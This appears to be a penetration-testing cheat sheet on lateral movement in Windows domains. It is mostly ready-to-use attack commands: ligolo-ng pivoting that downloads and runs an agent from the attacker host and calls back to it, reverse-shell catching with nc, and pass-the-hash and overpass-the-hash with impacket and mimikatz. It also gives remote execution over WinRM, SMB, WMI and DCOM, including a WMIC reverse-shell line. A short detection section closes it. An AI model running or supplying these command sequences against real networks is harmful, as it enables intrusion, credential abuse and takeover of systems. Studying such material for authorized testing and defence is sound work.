# Lateral Movement

Lateral movement covers the techniques used to move from one compromised system to another within a network. The goal is typically to reach higher-value targets — Domain Controllers, file servers, or systems where privileged users are logged in.

---

## Preparation Checklist

Before attempting lateral movement, confirm you have:

```
✓ Valid credentials (cleartext, NT hash, or Kerberos ticket)
✓ Network connectivity to the target (check firewall rules)
✓ Correct port open on target (445 for SMB, 5985 for WinRM, etc.)
✓ Sufficient privilege level on the target
```

Check connectivity first:

```bash
# From Kali
nmap -p 445,5985,5986,3389,135 <target_ip>

# From Windows
Test-NetConnection -ComputerName <target_ip> -Port 445
Test-NetConnection -ComputerName <target_ip> -Port 5985
```

---

## Quick Reference — Tool vs Scenario

| Scenario | Best Tool | Protocol |
|---|---|---|
| Interactive shell, cleartext creds | evil-winrm | WinRM 5985 |
| Interactive shell, NT hash | evil-winrm / psexec | WinRM / SMB |
| Command execution, stealthy | wmiexec | WMI 135 |
| Command execution, noisy but reliable | psexec | SMB 445 |
| Kerberos ticket lateral movement | Rubeus + PsExec | Kerberos |
| NTLM hash to Kerberos ticket | Overpass-the-Hash | Kerberos |
| No tools available (Windows only) | winrs / wmic | WinRM / WMI |
| PowerShell remoting | New-PSSession | WinRM 5985 |
| Pivot to internal network | ligolo-ng | TUN interface |

---

## Pivoting with Ligolo-ng (Primary Method)

Ligolo-ng creates a full TUN interface on Kali — no proxychains needed for most tools. All traffic routed through the interface goes transparently through the compromised host.

Download: https://github.com/nicocha30/ligolo-ng/releases/

### Step 1 — Set Up TUN Interface on Kali (One Time)

```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
```

### Step 2 — Start the Proxy on Kali

```bash
./proxy -selfcert
# Listens on 0.0.0.0:11601 by default
# Note the TLS fingerprint shown — used to verify on the agent side
```

### Step 3 — Transfer and Run Agent on Compromised Host

```powershell
# Download agent (Windows)
$ProgressPreference = "SilentlyContinue"  # Disables progress bar — much faster
iwr -uri http://<kali_ip>/agent.exe -UseBasicParsing -Outfile agent.exe

# Connect back to Kali proxy
.\agent.exe -connect <kali_ip>:11601 -ignore-cert
```

```bash
# Linux agent
./agent -connect <kali_ip>:11601 -ignore-cert
```

### Step 4 — Add Route on Kali to Internal Network

```bash
# Add route for the internal subnet reachable via the compromised host
sudo ip route add <internal_subnet>/24 dev ligolo

# Example from a real engagement
sudo ip route add 172.16.205.0/24 dev ligolo
```

### Step 5 — Start the Tunnel in Ligolo Console

```
# In the ligolo proxy console, select the session and start
[Agent : NT AUTHORITY\SYSTEM@WEB02] » start
INFO Starting tunnel to NT AUTHORITY\SYSTEM@WEB02
```

### Step 6 — Validate the Tunnel

```bash
# Sweep the internal network directly — no proxychains needed
crackmapexec smb 172.16.205.0/24

# Nmap the internal network
nmap -p 445,5985 172.16.205.0/24
```

### Local Port Forwarding (Access Internal Services)

Ligolo-ng supports local port forwarding via a special IP (`240.0.0.1`).

```bash
# Add the special route on Kali
sudo ip route add 240.0.0.1/32 dev ligolo
```

In the ligolo console on the agent session:
```
listener_add --addr 0.0.0.0:9090 --to 127.0.0.1:9090
```

Now `240.0.0.1:9090` on Kali reaches `127.0.0.1:9090` on the compromised host — useful for accessing internal web apps, databases, or services only listening on localhost.

### Reverse Shell Through Ligolo (Catching Shells from Internal Hosts)

When you need a shell from a host in the internal network to call back to Kali:

```bash
# In ligolo console — forward port 8888 from Kali through the agent
listener_add --addr 0.0.0.0:8888 --to <kali_ip>:8888

# Start listener on Kali
nc -nvlp 8888

# Trigger reverse shell on internal host pointing to the compromised pivot host
# The shell will arrive on Kali port 8888 via ligolo
```

### Chaining — Second Pivot (Agent on Internal Host)

When you need to pivot again through a second internal host:

```bash
# Download agent on the second pivot host (from first pivot via ligolo tunnel)
iwr -uri http://<kali_ip>/agent.exe -UseBasicParsing -Outfile agent.exe
.\agent.exe -connect <kali_ip>:11601 -ignore-cert

# Add the new internal subnet route on Kali
sudo ip route add <deeper_subnet>/24 dev ligolo

# In ligolo console — select the new agent session and start
```

### Cleanup

```bash
# Remove the ligolo interface when done
sudo ip link delete ligolo

# Remove added routes (done automatically when interface is deleted)
```

---

## From Kali

### evil-winrm

Requires WinRM (port 5985) open and user in Remote Management Users or Administrators.

```bash
# Cleartext password
evil-winrm -i <target_ip> -u <username> -p '<password>'

# NT hash
evil-winrm -i <target_ip> -u <username> -H <NT_hash>

# With domain
evil-winrm -i <target_ip> -u '<domain>\<username>' -p '<password>'

# Ignore SSL (port 5986)
evil-winrm -i <target_ip> -u <username> -p '<password>' -S

# Upload a file
upload /path/to/local/file C:\destination\file

# Download a file
download C:\path\to\remote\file /local/destination
```

### impacket-psexec

Creates a service on the target — noisy but gives SYSTEM shell.

```bash
# Cleartext password
impacket-psexec <domain>/<username>:<password>@<target_ip>

# NT hash (zero out LM)
impacket-psexec <domain>/<username>@<target_ip> -hashes 00000000000000000000000000000000:<NT_hash>

# Specify command instead of shell
impacket-psexec <domain>/<username>:<password>@<target_ip> whoami
```

### impacket-wmiexec

Uses WMI — no service creation, harder to detect than psexec.

```bash
# Cleartext password
impacket-wmiexec <domain>/<username>:<password>@<target_ip>

# NT hash
impacket-wmiexec -hashes 00000000000000000000000000000000:<NT_hash> <domain>/<username>@<target_ip>

# Run single command
impacket-wmiexec <domain>/<username>:<password>@<target_ip> "whoami"
```

### impacket-smbexec

Executes via SMB shares — leaves fewer traces than psexec.

```bash
# Cleartext password
impacket-smbexec <domain>/<username>:<password>@<target_ip>

# NT hash
impacket-smbexec -hashes 00000000000000000000000000000000:<NT_hash> <domain>/<username>@<target_ip>
```

### impacket-atexec

Executes commands via the Task Scheduler service.

```bash
# Cleartext password
impacket-atexec <domain>/<username>:<password>@<target_ip> "whoami"

# NT hash
impacket-atexec -hashes 00000000000000000000000000000000:<NT_hash> <domain>/<username>@<target_ip> "whoami"
```

### Kerberos-based (with ticket)

```bash
# Export ticket and use with any impacket tool
export KRB5CCNAME=<ticket>.ccache

impacket-psexec -k -no-pass <domain>/<username>@<target_host>
impacket-wmiexec -k -no-pass <domain>/<username>@<target_host>
impacket-smbexec -k -no-pass <domain>/<username>@<target_host>
evil-winrm -i <target_ip> -u <username> -k -no-pass -r <domain>
```

---

## From Windows

### Overpass-the-Hash

Converts an NTLM hash into a Kerberos TGT — useful when the target only accepts Kerberos.

```powershell
# Mimikatz — spawn a new PowerShell session as the target user
mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<NT_hash> /run:powershell

# From the spawned PowerShell session, access remote resources
# The session will use Kerberos tickets derived from the hash
dir \\<target_host>\C$
.\PsExec.exe \\<target_host> cmd
```

### PsExec (SysInternals)

```powershell
# With credentials
psexec.exe \\<target_ip> -u <domain>\<username> -p <password> cmd

# Using current session (if already running as privileged user)
psexec.exe \\<target_ip> cmd
```

### WinRM — New-PSSession

```powershell
# Create a remote session
$username = '<username>'
$password = '<password>'
$securePass = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($username, $securePass)

$session = New-PSSession -ComputerName <target_ip> -Credential $cred

# Run commands in the session
Invoke-Command -Session $session -ScriptBlock { whoami; hostname }

# Enter interactive session
Enter-PSSession -Session $session

# Copy files to remote session
Copy-Item -Path C:\tools\mimikatz.exe -Destination C:\Windows\Temp\ -ToSession $session
```

### WinRS (Command Line WinRM)

Simpler alternative to PowerShell remoting — runs a single command remotely.

```cmd
winrs -r:<target_ip> -u:<domain>\<username> -p:<password> "whoami"
winrs -r:<target_ip> -u:<domain>\<username> -p:<password> cmd
winrs -r:<target_ip> -u:<domain>\<username> -p:<password> "powershell -enc <payload>"
```

### WMIC (Windows Management Instrumentation)

```cmd
# Execute a command remotely
wmic /node:<target_ip> /user:<domain>\<username> /password:<password> process call create "cmd.exe /c whoami > C:\output.txt"

# Check if a process is running
wmic /node:<target_ip> /user:<username> /password:<password> process list brief

# Spawn a reverse shell
wmic /node:<target_ip> /user:<username> /password:<password> process call create "powershell -enc <base64_payload>"
```

### DCOM (Distributed Component Object Model)

Uses COM objects to execute commands on remote systems — requires local admin.

```powershell
# Create credential object
$username = '<domain>\<username>'
$password = ConvertTo-SecureString '<password>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($username, $password)

# Execute command via Invoke-Command over DCOM
Invoke-Command -ComputerName <target_ip> -Credential $cred -ScriptBlock { whoami }

# Use MMC20 COM object directly
$com = [System.Activator]::CreateInstance([System.Type]::GetTypeFromProgID("MMC20.Application", "<target_ip>"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c whoami > C:\output.txt", "7")

# Check if DCOM is enabled on target
Get-ItemProperty -Path "HKLM:\Software\Microsoft\OLE" -Name "DCOMServer"
```

---

## Pass-the-Hash for Lateral Movement

Any tool that supports NTLM authentication can use NT hashes directly. The LM portion can always be zeroed out.

```bash
# From Kali — impacket tools
impacket-psexec <domain>/<user>@<target> -hashes 00000000000000000000000000000000:<NT_hash>
impacket-wmiexec <domain>/<user>@<target> -hashes 00000000000000000000000000000000:<NT_hash>
evil-winrm -i <target_ip> -u <user> -H <NT_hash>
crackmapexec smb <target> -u <user> -H <NT_hash>

# From Windows — Mimikatz PTH
mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<NT_hash> /run:cmd
```

---

## Detection Notes

- Event ID 4624 — successful logon (type 3 = network, type 10 = remote interactive)
- Event ID 4648 — logon with explicit credentials
- Event ID 7045 — new service created (psexec indicator)
- Event ID 4688 — process creation (wmiexec, cmd spawned remotely)
- Unusual parent-child process relationships (WmiPrvSE.exe spawning cmd.exe)
- SMB connections from unusual sources at unusual hours
- `winrs` and `wmic` usage from non-admin workstations
- TUN interface creation and unusual routing table entries (ligolo indicator)